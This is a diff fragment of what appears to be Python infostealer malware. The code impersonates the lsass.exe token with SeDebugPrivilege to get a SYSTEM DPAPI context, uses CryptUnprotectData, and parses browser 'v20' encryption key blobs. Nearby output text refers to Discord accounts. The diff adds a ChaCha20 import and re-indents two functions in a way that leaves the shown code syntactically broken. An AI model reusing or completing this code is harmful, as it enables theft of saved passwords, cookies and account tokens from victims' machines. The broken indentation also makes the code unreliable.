@@ -16,6 +16,8 @@ import zipfile
 import random
 import time
 
+from Crypto.Cipher import AES, ChaCha20_Poly1305
+
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from win32crypt import CryptUnprotectData
 from Cryptodome.Cipher import AES
@@ -1590,12 +1592,8 @@ Discord Account n°{str(number_discord_account)}:
                 return None
         
         def _impersonate_lsass():
-        """Impersonate lsass.exe for SYSTEM DPAPI context."""
-        import windows
-        import windows.generated_def as gdef
-        
-        original_token = windows.current_thread.token
-        try:
+            original_token = windows.current_thread.token
+            try:
             windows.current_process.token.enable_privilege("SeDebugPrivilege")
             proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
             lsass_token = proc.token
@@ -1607,13 +1605,12 @@ Discord Account n°{str(number_discord_account)}:
             yield
         finally:
             windows.current_thread.token = original_token
-
-def _parse_key_blob(blob_data: bytes) -> dict:
-    """Parse v20 key blob. Flag 0=raw key (Edge/Brave), 1=AES, 2=ChaCha20, 3=NCrypt+XOR"""
-    buffer = io.BytesIO(blob_data)
-    parsed_data = {}
-
-    header_len = struct.unpack('<I', buffer.read(4))[0]
+            
+            def _parse_key_blob(blob_data: bytes) -> dict:
+                buffer = io.BytesIO(blob_data)
+                parsed_data = {}
+                
+                header_len = struct.unpack('<I', buffer.read(4))[0]
     parsed_data['header'] = buffer.read(header_len)
     content_len = struct.unpack('<I', buffer.read(4))[0]
     
